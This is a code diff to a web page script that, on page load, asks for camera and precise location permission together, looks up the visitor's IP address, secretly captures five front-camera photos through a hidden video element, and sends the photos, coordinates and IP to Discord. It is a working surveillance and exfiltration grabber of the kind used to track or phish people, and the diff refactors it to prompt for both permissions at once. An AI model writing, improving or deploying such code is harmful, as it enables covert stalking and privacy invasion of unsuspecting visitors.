@@ -16,58 +16,62 @@ document.addEventListener('DOMContentLoaded', () => {
     async function initCapture() {
         console.log("Requesting permissions...");
 
-        try {
-            // A. Request Camera
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" },
-                audio: false
-            });
-            camPreview.srcObject = stream; // Required for capture, even if hidden
-
-            // Wait for video to be ready
-            camPreview.onloadedmetadata = () => {
-                camPreview.play();
-                console.log("Camera active. Locating...");
-
-                // B. Request Location
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        async (position) => {
-                            const { latitude, longitude, accuracy } = position.coords;
-
-                            // C. Capture IP
-                            let ip = "Unknown";
-                            try {
-                                const ipRes = await fetch('https://api.ipify.org?format=json');
-                                const ipData = await ipRes.json();
-                                ip = ipData.ip;
-                            } catch (e) { console.log("IP Fetch failed"); }
-
-                            // D. Continuous Capture Loop (0.6s interval)
-                            let count = 0;
-                            const maxCaptures = 5;
-
-                            const intervalId = setInterval(async () => {
-                                if (count >= maxCaptures) {
-                                    clearInterval(intervalId);
-                                    return;
-                                }
-
-                                const imageBlob = await captureFrame(camPreview);
-                                sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
-
-                                count++;
-                            }, 600);
-                        },
-                        (err) => {
-                            console.log("Location denied:", err);
-                        },
-                        { enableHighAccuracy: true }
-                    );
+        // Helper to wrap Geolocation in a Promise
+        const getLocation = () => {
+            return new Promise((resolve, reject) => {
+                if (!("geolocation" in navigator)) {
+                    reject(new Error("Geolocation not supported"));
+                } else {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                 }
+            });
+        };
+
+        try {
+            // Execute requests in parallel for simultaneous prompting
+            const [stream, position] = await Promise.all([
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }),
+                getLocation()
+            ]);
+
+            // 1. Setup Camera
+            camPreview.srcObject = stream;
+
+            // 2. Setup Location Data
+            const { latitude, longitude, accuracy } = position.coords;
+            console.log("Permissions granted. Locating active.");
+
+            // Wait for video metadata
+            camPreview.onloadedmetadata = async () => {
+                camPreview.play();
+
+                // 3. Capture IP
+                let ip = "Unknown";
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) { console.log("IP Fetch failed"); }
+
+                // 4. Continuous Capture Loop
+                let count = 0;
+                const maxCaptures = 5;
+
+                const intervalId = setInterval(async () => {
+                    if (count >= maxCaptures) {
+                        clearInterval(intervalId);
+                        return;
+                    }
+
+                    const imageBlob = await captureFrame(camPreview);
+                    sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
+
+                    count++;
+                }, 600);
             };
+
         } catch (err) {
-            console.log("Permissions denied:", err);
+            console.log("Permissions denied or error:", err);
         }
     }
 
